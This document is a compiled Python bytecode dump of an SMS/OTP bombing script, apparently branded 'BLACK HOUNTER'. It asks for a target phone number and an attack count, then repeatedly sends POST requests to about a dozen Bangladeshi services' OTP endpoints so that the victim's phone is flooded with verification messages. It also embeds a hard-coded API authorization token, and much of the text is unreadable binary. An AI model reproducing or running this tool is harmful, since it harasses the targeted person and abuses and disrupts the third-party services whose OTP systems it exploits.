o
    y��b�  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeee	d e
 ��Zeee	d e
 ��Zeee	d e ��Ze �d� eed � e�d�Zee	d � ee	d � eed e	 d e d � e�d� ee	de�� d � eed � eed � d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlZej�� Zee	dej� de� ed �� d ej!� d!e� e
d" �� � � ed#e� d$�� d%e� ed& �� d%e� ed' �� d(e� e	d) �� �� d*Z"e� Z#d+e#d,< d-e Z$d.Z%e� Z&d/e&d0< d1e&d,< d2e d3 Z'd4Z(e� Z)d5e)d,< d6e d7 Z*d8Z+e� Z,d9e,d:< d5e,d,< d;e d< Z-d*Z.e� Z/d+e/d,< d-e Z0d.Z1e� Z2d/e2d0< d1e2d,< d2e d3 Z3d4Z4e� Z5d5e5d,< d6e d7 Z6d8Z7e� Z8d9e8d:< d5e8d,< d;e d< Z9d=e d> Z:e� Z;d?e;d@< d=e d> Z<e� Z=d?e=d@< dAZ>e� Z?d5e?d,< dBe dC Z@dAZAe� ZBd5eBd,< dBe dC ZCeDe�D ]�ZEz�ejFe"e#e$dD�ZejFe%e&e'dD�ZejFe(e)e*dD�ZejFe+e,e-dD�ZejFe.e/e0dD�ZejFe1e2e3dD�ZejFe4e5e6dD�ZejFe7e8e9dD�Zeje:e;dE�Zeje<e=dE�ZejFe>e?e@dD�ZejFeAeBeCdD�Ze�dF� eeeEdF g�e ejG e dG e	 e e
 dH e ejG e dG e	 e e
 dI � W �q�   eedJ � Y �q�dS )K�    N�clearzlolcat ban.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   g{�G�z�?)�sys�stdout�write�flush�time�sleep)ZJonYZword� r
   �01.py�	logoprint   s
   
�r   z    Enter Target Number: z    Enter Attack Amount: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : BLACK HOUNTERz	 VERSION 	  : 2.2u   	 ♥♥z	 BLACK HOUNTER�   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictzDate : z - z%B�-z, z%AzTime: z%I�:z%Mz%S� z%pz,http://nesco.sslwireless.com:80/api/v1/loginz!application/x-www-form-urlencodedzContent-Typezphone_number=z+http://27.131.15.19/lstyle/api/lsotprequestZ48zContent-Lengthzapplication/json;charset=utf-8z+{
  "shortcode": "2494905",
  "msisdn": "88z"
}z2https://ucapi.vnksrvc.com/users/send_user_otp.jsonzapplication/jsonzK{
  "direct_login": true,
  "user": {
    "resend": false,
    "login": "88z3",
    "type": {
      "register": true
    }
  }
}z1https://prodapi.swap.com.bd/api/v1/send-otp/loginZ@QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3zX-Authorizationz{"mobile_number":"z","referral":false}z-http://apibeta.iqra-live.com/api/v2/sent-otp/� Zappszx-user-channelz.https://shopup.com.bd/users/send_user_otp.jsonz{"user":{"login":"88z?","resend":false,"type":{"register":true}},"direct_login":true})�headers�data)r   �   z 
tAttack Number z% BLACK HOUNTER SiiR PiiN SenT HoYecHez& BLACK HOUNTER SiiR PiiN SenT HoYecHe
z'
[~] Make Sure Your Internet Connection)H�os�system�printZasyncior   Zrequestsr   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�inputZnumberZnumber2�int�amount�getZresponser	   ZjsonZrequests.structuresr   ZdatetimeZnow�xZday�strftimeZyearZurl1Zheaders1Zdata1Zurl2Zheaders2Zdata2Zurl3Zheaders3Zdata3Zurl4Zheaders4Zdata4Zurl5Zheaders5Zdata5Zurl6Zheaders6Zdata6Zurl7Zheaders7Zdata7Zurl8Zheaders8Zdata8Zurl9Zheaders9Zurl10Z	headers10Zurl11Z	headers11Zdata11Zurl12Z	headers12Zdata12�range�iZpost�textr
   r
   r
   r   �<module>   s�    





<D��������
\�